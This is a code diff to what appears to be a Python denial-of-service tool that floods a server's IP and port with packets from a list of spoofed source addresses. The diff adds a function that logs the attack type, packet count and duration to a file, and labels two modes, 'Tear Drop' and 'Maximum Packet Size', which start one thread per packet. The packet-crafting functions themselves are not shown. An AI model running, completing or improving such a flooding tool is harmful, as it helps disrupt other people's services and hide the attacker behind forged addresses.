@@ -11,6 +11,15 @@ start_time = 0
 # Locks for thread-safe access to shared variables
 sent_packets_lock = threading.Lock()
 
+def log_results(attack_type, packets_sent, duration):
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    with open("attack_results.txt", "a") as file:
+        file.write(f"Timestamp: {timestamp}\n")
+        file.write(f"Attack Type: {attack_type}\n")
+        file.write(f"Packets Sent: {packets_sent}\n")
+        file.write(f"Duration: {duration} seconds\n")
+        file.write("=" * 50 + "\n")
+
 # Function representing the task to be performed in each thread
 def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
     global sent_packets, start_time
@@ -73,8 +82,9 @@ def main():
     # Create a tqdm progress bar
     with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
         threads = []
-        # Create threads and start the attack
+
         if attack_number == 1:
+            attack_type = "Tear Drop"
             for _ in range(number_of_packets):
                 thread = threading.Thread(target=send_tear_drop_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                 threads.append(thread)
@@ -82,16 +92,25 @@ def main():
 
             for thread in threads:
                 thread.join()
-        
+
         elif attack_number == 2:
+            attack_type = "Maximum Packet Size"
             for _ in range(number_of_packets):
                 thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                 threads.append(thread)
                 thread.start()
 
-            # Wait for all threads to complete
             for thread in threads:
                 thread.join()
 
+    # Calculate attack duration
+    end_time = time.time()
+    attack_duration = end_time - start_time
+
+    # Log attack results to a file
+    log_results(attack_type, number_of_packets, attack_duration)
+
+
+        
 if __name__ == "__main__":
     main()
